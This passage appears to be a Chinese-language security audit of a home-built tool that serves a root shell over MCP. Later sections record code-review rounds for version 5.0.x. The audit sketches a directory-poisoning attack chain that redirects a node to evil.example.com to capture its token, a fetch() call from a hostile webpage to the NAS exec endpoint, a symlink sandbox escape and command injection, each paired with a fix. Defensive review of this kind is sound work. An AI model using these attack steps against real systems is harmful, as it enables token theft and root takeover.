## 一、结论速览

**这套东西的设计意图是清楚的**：副端把 root shell 挂成 MCP 工具，v3.0 也确实补了
token 鉴权、IP 白名单、保活、地址目录。**但「安全默认值」是反的** —— 默认无鉴权、
默认绑 `0.0.0.0`、默认 `allowed_roots=["/"]`，只有加了 `--tunnel` 才会自动生成令牌。

> ### 🔴 最紧急的一条（已实测确认，不是推断）
>
> 你的飞牛副端 `192.168.1.10:3100` 跑的是 **v1.0.0 旧版，完全没有鉴权**。
> 我在**不带任何凭据**的情况下调了一次 `exec`，返回：
>
> ```
> {"content":[{"text":"[exit 0]\nFLEET_UNAUTH_OK\nroot\n"}]}
> ```
>
> 也就是说：**此刻同网段内任何设备，都能以 root 身份在你 NAS 上执行任意命令。**
> 你的网段里还有 5 台 IP 摄像头、访客设备、各类 IoT —— 任何一台被拿下，NAS 就跟着沦陷。
> 而且 NAS 上的 `:8000`（ms-relay）、`:4000`（DeeperSeeker）、`:5432`（postgres）都在同一台机器上。

## 三、逐项详述

### 1. 🔴 默认无鉴权 + 绑 0.0.0.0 + root 执行

**证据**

- `install.sh` 第 45 行：`AUTH_TOKEN=""` —— 默认空。
- 只有 `--tunnel` 会触发自动生成（`mcp-tunnel.sh` 里 `if [ -z "$TOKEN" ]`）。
  **内网安装（NAS 的典型场景）不会生成 token。**
- systemd 单元固定 `--host 0.0.0.0`，nohup 模式同理 → 全网卡监听。
- 现场实测：`GET http://192.168.1.10:3100/` 返回 `auth: None`、`root: True`；
  无凭据 `tools/call exec` 直接返回 `root`（见开头）。
- 现场实测：`/opt/nas_mcp/mcp_agent_config.json` 权限 **0644 root:root**。

**影响**：同网段 = 无门槛 root。这不是"仅限内网所以没事"——内网里有一堆你控制不了的设备。

**修法**
```bash
# 立刻：给现有的裸奔副端要么加 token，要么停掉
bash /opt/nas_mcp/mcp-ctl.sh stop          # 不用时直接关，最省事
# 或升级到 v3.0 并显式带 token 重装
```
代码层建议：把 `auth_token` 为空从"警告"升级为**安装期硬错误**
（除非显式传 `--i-know-its-insecure`）；绑定地址默认改成 `127.0.0.1`，
要外网再显式 `--host 0.0.0.0`。

---

### 2. 🔴 CORS 通配 `*` + 无鉴权 → 网页可打内网

`mcp_agent.py` 的 `_cors()` 对**所有**响应（包括 `OPTIONS` → 204 预检）发：

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: GET,POST,OPTIONS,DELETE
```

浏览器侧后果：你只要访问了任意一个恶意/被挂马的网页，该网页就能
`fetch('http://192.168.1.10:3100/mcp', {method:'POST', body: '<exec 命令>'})`，
并且**能读到返回值**（因为 ACAO 是 `*`）。若无 token，等于把 NAS root 交给了每一个网页。

**缓解与残余风险**：新版 Chrome 的 Private Network Access 会拦截"公网页面 → 私网地址"的请求，
但 **Firefox / Safari 目前不拦**；而走 trycloudflare 的**公网 https 地址完全不受 PNA 限制**。

**修法**：默认**不发送任何 CORS 头**（MCP 客户端是程序不是浏览器，本来就不需要 CORS）；
确需跨域时按 `Origin` 白名单回显，而不是 `*`。

---

### 3. 🔴 地址目录可被投毒 → 令牌外泄 + 节点被劫持

这是整套架构里**最隐蔽也最危险**的一条链路。

**目录服务侧（`fleet-directory.py`）**
- `--token` 默认空 → `_authed()` 直接 `return True`，**任何能访问 `:8790` 的人都能 `POST /register`**。
- `register()` 只校验 `name` 非空、`url` 以 http(s) 开头；**`name` 是唯一键、后写覆盖**，
  没有 per-node 密钥、没有来源校验、没有速率限制。
- 文档还建议把它跑在"7x24 的机器，比如 NAS / 云主机" → 很可能暴露到公网。

**主端侧（`fleet.py`）**
- `sync_from_directory()` 拿到目录给的 URL 后，会**用该节点自己的 Bearer token** 去探测：
  ```python
  if not http_probe(new_mcp, timeout=..., token=token):   # ← token 发给了新地址
  ```
  探测"通过"的条件只是对方返回合法 JSON —— 攻击者随便回个 `{"status":"ok"}` 即可。
- 探测通过后**直接把新地址写进登记表**（`node["url"] = new_mcp`），此后长期生效。
- `cmd_sync()` 更激进：**完全不探测**，`normalize_url()` 之后直接落盘。

**完整攻击链**
```
攻击者 POST /register {"name":"nas","url":"https://evil.example.com"}
   → 主端 fleet.py exec nas ... 时发现原地址不通（或直接跑 fleet.py sync nas）
   → 主端把 nas 的 Bearer token 发给 evil.example.com     ← 令牌泄漏
   → evil 回 {"status":"ok"}                              ← 探测"通过"
   → 登记表里 nas 被永久改写                              ← 节点劫持
```
拿到 token 后，攻击者还能反过来直连副端执行命令。

**现场旁证**：本机 `~/.mcp-fleet/directory.json` 里现在就有一条
`nas → https://new-url.trycloudflare.com`（早期测试残留）——
只要跑一次 `fleet.py sync nas`，这条假地址就会被写进登记表。

**修法**
1. 目录服务**强制** `--token`（无 token 拒绝启动，或只允许绑定 127.0.0.1）。
2. 注册用 **per-node 密钥**，或对 `(name, url, ts)` 做 HMAC 签名，主端验签后才采信。
3. 主端**绝不**把节点令牌发给"未经确认的新地址"：先问目录拿到 URL，用**目录令牌**（而非节点令牌）
   做一次握手校验，且限制新 URL 必须与旧 URL 同域（`*.trycloudflare.com`）。
4. `cmd_sync` 也要探测 —— 目前它比 `sync_from_directory` 更宽松。

### 4. 🟠 目录 `GET /` 无鉴权且 dump 全量节点

`fleet-directory.py:do_GET` 里 `/` 分支**没有调用 `_authed()`**，直接返回：

```json
{"auth": true, "store": "/root/.mcp-fleet/directory.json",
 "nodes": {"nas": {"url": "...", "port": 3100, "remote": "1.2.3.4", "hits": 7, "age": 12}}}
```

即使设了 `--token`，任何人仍能从 `/` 拿到**整个集群的公网入口清单 + 本地存储路径**。

**修法**：`/` 也走 `_authed()`，或只回 `{"ok":true,"count":N}`。

---

### 5. 🟠 所有下载物零完整性校验（供应链）

- `mcp-tunnel.sh` 依次从 **`ghfast.top` → `ghproxy.net` → github.com** 下载 cloudflared 二进制，
  `curl -fsSL -o "$BIN"` 之后直接 `chmod +x` 并以**副端 root 身份常驻运行**。
  **全程没有任何 sha256/签名校验。**
- 在线安装的那条"一条命令"（文档第一节）**打印 md5 但从不比对** —— 我实测时也是肉眼看。
- `fleet.py bootstrap --online` 从镜像 `curl -fsSL ... && sudo bash`，同样无校验。
- 那三个 `gh*` 都是**第三方反代**，有能力篡改内容。

**影响**：一次镜像投毒 = 云主机/NAS 的 root。属于典型的供应链入口。

**修法**
1. 把 cloudflared 的 sha256 固定值写进脚本，下载后 `sha256sum -c` 校验，失败即退出。
2. `install.sh` 官网发布时给一个 `install.sh.sha256`，在线命令里**真正比对**（现在只是打印）。
3. cloudflared 优先走 `https://github.com/...` 官方源，镜像只作为降级并强制校验。

---

### 6. 🟠 令牌/密码明文落盘，且权限不会自愈

- **实测**：`/opt/nas_mcp/mcp_agent_config.json` = `0644 root:root` → **同机任何用户可读**，
  里面有 `auth_token`，若配了 `sudo_password` 也在里面。
- `install.sh` 只在两个分支 `chmod 600`：**新建配置时**（第 922 行）、
  **带参数重装并合并时**（第 954 行）。**重装不带参数 → 保持旧权限，不会收紧。**
- 主端 `fleet.py:save_registry()` 写 `~/.mcp-fleet/nodes.json`（含明文 token）时
  **既不 chmod 也不设 umask** → Linux 上默认 0644。

**修法**：安装结束**无条件** `chmod 600`（含重装路径）；
主端登记表 `os.chmod(..., 0o600)`；`sudo_password` 建议改存外部文件或走 sudoers NOPASSWD。

### 7. 🟠 `hmac.compare_digest` 遇非 ASCII 抛 TypeError（已复现）

```python
>>> hmac.compare_digest("tök", "abc")
TypeError: comparing strings with non-ASCII characters is not supported
```

`check_access()` 里 `got` 来自请求头（HTTP 头按 latin-1 解码，字节 >0x7F 就变成非 ASCII 字符）。
攻击者发一个带非 ASCII 字节的 `Authorization` 头即可让 `check_access` 抛异常，
一路冒到 `socketserver.handle_error` → 打 traceback、连接被断。进程不会死，
但这是个**未捕获异常路径**，也说明鉴权入口缺少类型防护。`fleet-directory.py:_authed()` 同样写法。

**修法**：比较前统一编码 —— `hmac.compare_digest(got.encode("utf-8"), tok.encode("utf-8"))`。

---

### 8. 🟡 bootstrap 关闭主机密钥校验；密码/令牌走命令行

- `-o StrictHostKeyChecking=no`（ssh 与 scp 都是）→ 失去 MITM 防护，
  而这条通道要传的是**以 root 执行的安装脚本**。
- `sshpass -p <密码>` → 密码出现在本机 `ps` 输出里。
- `opts += " --auth-token '%s'" % a.auth_token` / `--sudo-pass '%s'`：用单引号拼进远程命令，
  值里只要含 `'` 就会破坏引号 → **命令注入**。`--name` 更是完全没加引号。
  （令牌通常由 `token_urlsafe` 生成不含单引号，实际风险低，但属于错误模式。）

**修法**：去掉 `StrictHostKeyChecking=no`（或至少 `accept-new`）；
改用 `shlex.quote()` 拼接；密码走 `--password-file` 或 SSH 密钥。

---

### 9. 🟡 `allowed_roots` 是名义沙箱

- `_check_path()` 用 `os.path.abspath()` 比较前缀，**不解析符号链接** →
  在允许目录里放一个软链指向 `/etc/shadow` 即可逃逸（`sed`/`cat` 会跟随软链）。
- 默认值就是 `["/"]` → 等于不限制。
- 更关键的是：它**只作用于 read/write/edit/list_dir**，`exec` 完全不受约束，
  而 `exec` 本来就能读一切。所以默认配置下这个"安全边界"**提供零实际保护**。

**修法**：改用 `os.path.realpath()`；文档明确写"allowed_roots 不约束 exec"，
避免使用者以为设了就安全。

---

### 10. 🟡 资源耗尽面

- `mcp_agent.py:do_POST`：`length = int(self.headers.get("Content-Length") or 0)` 之后
  `self.rfile.read(length)`。**没有上限校验**，也没有负值校验（`-1` 会读到 EOF 才返回）
  → 单个连接即可长时间占住一个线程。
- `ThreadingHTTPServer` 每个连接一个线程；`/sse` 连接会在一个 `while True` 里常驻，
  **没有并发上限** → 可被打满线程。
- `AUTH_FAILS` 字典只增不减（按来源 IP），虽然有 60s 窗口重置计数，但条目不清。
- `fleet-directory.py`：`register` 无速率限制、`name` 无数量上限、**每次注册都 `save_store()` 落盘**
  → 未鉴权（默认）时可被刷爆磁盘与内存。

**修法**：限制 `1 <= Content-Length <= 1MB`；SSE 并发上限；
`register` 加限速与条目上限；只在内容变化时落盘。

---

### 11~13. 低危

- **指纹泄露**：`GET /` 自报 `auth` / `root` / `tools` / `tool_names`，
  未鉴权时等于告诉扫描者"这里有个不带锁的 root shell"。
- **旧工具不兼容**：`add_fleet_node.py`、`call_node.py`、`probe_fleet.py` **完全不支持 token**，
  对 v3.0 副端一律 401；且 `probe_fleet.py` 会**无条件执行一次 `exec`（uname -a）**，
  指向不可信地址时会主动执行命令。建议标注弃用或补 `--token`。
  主端 `mcp.json` 里 `cloud` / `fnos` 两条就是旧工具写的，**没有 headers**。
- **`FLEET_NO_AUTH=1`**：明确的裸奔开关，会大声警告，但没有二次确认（比如要求输入 yes）。

## 四、专项：隧道到底安不安全？

**传输层**：cloudflared 快速隧道（trycloudflare）走的是 TLS，**加密本身没有问题**，
也没有暴露你 NAS 的真实 IP。

**但它的安全模型和你想的不一样**：

| 维度 | 实际情况 |
|---|---|
| 地址是否算秘密 | ❌ 不算。`*.trycloudflare.com` 子域可被枚举/扫描，"随机即安全"不成立 |
| 是否有客户端证书 | ❌ 没有，任何能访问该 URL 的人都算"客户端" |
| 是否能限制来源 IP | ⚠️ 基本不行 —— 走隧道时来源是 cloudflared 的本机地址，`allow_ips` 与隧道互斥（脚本注释里也承认了） |
| 真正的门禁 | ✅ **只有应用层 `auth_token`** |
| 传输完整性 | ⚠️ 见第 5 条：cloudflared 二进制从第三方镜像下载且无校验 |

**结论**：

> **隧道的安全性 100% 取决于 `auth_token`。**
> token 够强（32 字节随机 ✔）、不外泄、且地址目录没被投毒的情况下，
> 隧道属于"可用"级别；**这三条缺任何一条，等于把你的 root shell 挂到公网上。**

**当前实际风险点**（我实测到的）：
1. `nas` 副端**根本没有 token** —— 如果路由器上做过 3100 端口映射，那就是公网裸奔；即便没有，内网也是裸的。
2. 主端 `mcp.json` 里的 `cloud`、`fnos` 条目**没有 headers**（旧工具写的）→ v3.0 副端接不上，也说明这套链路还没按 token 体系跑通。
3. 地址目录默认无 token，一旦放到公网，token 与节点地址都会经手第三方观测面。

**建议（按性价比排序）**
1. **公网入口改用 named tunnel（固定域名）+ Cloudflare Access**（零信任：身份认证在 Cloudflare 边缘做，副端根本收不到未认证流量）。你已有域名的话这是最彻底的解法。
2. 暂时继续用 quick tunnel 的话：强 token + 绝不用 `FLEET_NO_AUTH=1` + 目录服务不对外。
3. 不用的时候直接停：`bash /opt/<name>_mcp/mcp-ctl.sh stop`（隧道一并断开）。

## 八、二轮代码审查自检记录（v5.0.1，2026-10-17）

> v5.0.1 发布前对 v5.0 新增代码路径（加密/签名/Dashboard/安装器）做的第二轮系统性审查，
> **实锤复现四个缺陷并全部修复**。老路径已有 61 用例护栏，本轮聚焦增量。

### 8.1 缺陷三：邮箱明文回写（严重级，加密静默失效）

- **发现方式**：加密路径代码走查 —— 顺着 `_load_jsonl`（读时解密）→ 修改 →
  `_save_jsonl`（写回）的数据流检查写侧是否重新加密
- **根因**：写回未过加密钩子，任何"读-改-写"操作（投递重试计数/成功移出/poll 拉取）
  一次，整个邮箱文件退化为明文；投递循环每 15s 触发，等于加密在生产环境必然失效
- **实锤**：`outbox_increment_attempt` 调用一次后，outbox 文件逐行检查全部为明文
- **修复**：`_save_jsonl` 写盘前逐条过 `_encrypt_field`（幂等设计，已有 `enc1$` 前缀
  不二次加密），inbox/outbox/sent 全路径覆盖
- **回归**：修复后任意读写轮次密文保持；61 用例全绿

### 8.2 缺陷四：远程 agent 单播永远投不出（架构级）

- **发现方式**：`t_msg_send` → `deliver_now` 投递路径走查，枚举 `to` 字段所有取值形态
- **根因**：`deliver_now` 只匹配 `to in peers`（peer 是节点名），单播给远程 agent（agent
  名）永不命中 → False → 消息滞留 outbox（仅 `to=*` 广播可经 poll 到达）；且
  `/fleet/sync` 收到对端 `local_agents` 直接丢弃，归属信息无传播通道
- **修复**：`deliver_now` 新增归属匹配（遍历 peers 的 `agents` 命中则投宿主节点）+
  `SyncEngine.on_peer_agents` 回调 + `_note_peer_agents` 落盘（有变化才写，上限 64）
- **实锤**：双节点 HTTP 端到端 —— 归属同步前投递 False，gossip 一轮同步后 True，
  宿主节点 `/fleet/mail` 实收 `to=agent-x` 消息

### 8.3 缺陷五：PBKDF2 每条消息重复派生（性能级）

- **发现方式**：性能敏感点排查（PBKDF2 100k 轮 = 单次 ~18ms）
- **根因**：每条消息独立 salt → 每条都要重新派生密钥；N 条消息解密 ~N×18ms，
  50 条实测 0.89s，被投递循环(15s)/Dashboard(5s)/gossip(60s) 高频重复支付
- **修复**：`_derive_key` LRU 缓存（上限 128，锁保护）+ 邮箱固定 salt
  （`mailbox/.salt`）→ 同一邮箱共享派生密钥；nonce 仍每条随机，安全性等价；
  旧格式解密自动兼容
- **实锤**：50 条消息读取 0.89s → 0.00s（>100 倍）

### 8.4 缺陷六：Windows 中文路径启动脚本乱码（跨平台级）

- **发现方式**：`install.py` 全文走查，检查所有文件写入的编码假设
- **根因**：bat 以 utf-8 写入，cmd 按 ANSI 代码页（中文系统 = GBK）解码，中文用户名
  安装路径乱码（`张三`→`寮犱笁`）→ `cd /d` 失败，节点起不来
- **修复**：`_write_bat` 按系统 ANSI 代码页写入；ASCII 路径字节与旧版完全一致（零回归），
  极端不可编码字符退回 utf-8；Startup 自启 bat 同步修复
- **实锤**：GBK 模拟验证四场景（中文落盘读回一致/旧版乱码复现/ASCII 零回归/极端字符不崩溃）

### 8.5 本轮同时复查确认无恙的项

- `dashboard_html.py`：XSS 防护完整（`esc()` 覆盖所有动态注入点），token 走 URL
  fragment 不落日志
- fleet 全部端点的 `_guard()` 鉴权闸门：do_POST/do_GET 入口全覆盖，配 token 时无旁路
- `check_access` 的 `hmac.compare_digest` bytes 比较：防 surrogateescape 变体攻击，正常

## 九、三轮代码审查自检记录（v5.0.2 连接稳定性，2026-10-17）

> 第三轮审查聚焦**连接稳定性**：设备异构（NAS/云主机/办公室电脑/软路由）、网络异构
> （局域网/跨网段中转）是本作品的天然场景，节点离线/挂死是常态而非异常。
> 本轮回答的问题：**一个下线的 peer 会让网络表现如何？**

### 9.1 缺陷七：死节点拖垮投递循环（核心级）

- **发现方式**：投递路径压力推演——枚举「peer 下线/挂死/网络分区」三类故障形态下
  `delivery_loop` 的行为
- **根因**：每 15s 串行重试**全部** pending 消息，无退避、无熔断、超时 10s。
  一个「挂起不响应」的主机（TCP accept 后不回复，跨网段中转常见）配 N 条消息
  = 每轮 N×10s 白等；消息越多周期越长，给健康节点的消息被堵在队尾
- **实锤**：3 peer 场景（健康 + 死端口 + 挂起主机）各 2 条消息——第 1 轮 12.04s
  （挂起主机 2×6s），修复前第 2 轮（15s 后）重付 12s，循环实际周期 27s+
- **修复三层**：
  1. `PeerHealth` 熔断器：连续失败 2 次 → 冷却期（90s 指数翻倍封顶 30min），
     期间一切主动连接零等待跳过，到期放一次探测，成功即恢复——长期离线设备的
     连接开销从「每 15s 一次 6s 超时」降为「每冷却期一次探测」
  2. 消息级退避：attempts 0-4 每 15s、5-9 每 60s、10-14 每 240s、15-19 每 960s、
     20+ 每 1h——短暂离线（设备重启）快速恢复投递，长期离线降频
  3. 客户端超时 10s → 6s（局域网/中转场景实测足够）+ 单轮批量上限 50
- **回归**：修复后第 2 轮投递 0.000s（零 HTTP）；退避到期后熔断仍拦截死 peer
  （0.000s），健康 peer 正常投递不受影响

### 9.2 缺陷八：outbox 无限膨胀（资源级）

- **发现方式**：追踪失败消息的生命周期——append 后若永不成功，attempts 与文件体积
  双无限增长
- **修复**：重试上限 250 次（按退避节奏约 2 天，覆盖「设备周末关机」场景），
  到顶标 `status=dead` 停止重试、记录保留供审计；`outbox_pending`（统计语义）与
  `outbox_retryable`（投递语义）分离，Dashboard 显示的待投递数不被退避干扰

### 9.3 缺陷九：gossip 被死 peer 拖慢（同步级）

- **根因**：`sync_loop` 串行遍历 peers，死 peer 每轮白等一次超时，后续 poll 序列
  再放大（sync 成功后按 local_agent 逐个 poll）
- **修复**：`SyncEngine` 与 `MessageDelivery` 共享同一 `PeerHealth` 实例——
  投递链路发现的死节点，同步链路同步跳过，健康状态全局部一致；实测冷却 peer
  的 gossip 零等待，健康 peer 的 sync + poll 正常

### 9.4 连接稳定性可视化

- Dashboard peer 卡片新增「冷却 Ns」徽标（`/fleet/ui/data` 增加 `cooldown` 字段），
  运维视角一眼看出哪些节点处于熔断冷却中

## 十、四轮代码审查自检记录（v5.0.3 长期运行可靠性，2026-10-17）

### 10.1 缺陷十：邮箱文件只增不减（高危，B10）

- **发现方式**：枚举全部文件写入点，追踪「append 后是否有对应的移出/截断」——
  inbox（读只推进 cursor）、sent（投递成功永久追加）、outbox dead（v5.0.2 新增

- **实锤**：30 天 200 条/天场景 0.9MB、读取线性变慢；重放 180 天 36000 条
  已读 = 4.9MB、`inbox_read` 均耗 0.456s（全量加载 + 逐条解密）
- **修复**：`maintenance()` compaction 三规则——① inbox 超窗口（500）时从最旧
  清「全员已读（id <= min 各 cursor）」；未读永远保留（agent 长期未读的数据
  不是垃圾，且未注册 agent 不参与 min 计算，保守保留）；小邮箱不动（避免无谓
  写入）② sent 截断保留 200 ③ dead 截断保留 200。投递循环每 3600s 顺带触发，
  持锁原子写复用 `_save_jsonl` 加密回写（与 B1 修复交互验证：清理后密文保持）

### 10.2 缺陷十一：/fleet/mail 无限流无容量（中危，S1）

- **发现方式**：检查 `rate_limit_allow()` 的全部调用点——只覆盖工具层 peer_call，
  fleet 端点（mail/sync/poll）不在限流范围
- **风险**：配 token 防陌生人，但配对的失控节点/token 泄露可无限塞消息（1MB/条）
  耗尽磁盘
- **修复**：独立令牌桶 `rate_limit_mail()`（600/min 默认，与工具层桶分离——广播
  一条消息 = 每个 peer 一次 POST + 重试，天然比人工调用高频）+ inbox 容量硬上限
  `max_inbox_msgs`（5000 默认，超出 507）。真实节点实测：cap=3 时第 4-5 条 POST
  返回 429；inbox=10 时第 11-12 条返回 507

- `fleet.py doctor` 新增第 7 项「协议层体检」：链路全绿但消息发不出去时，
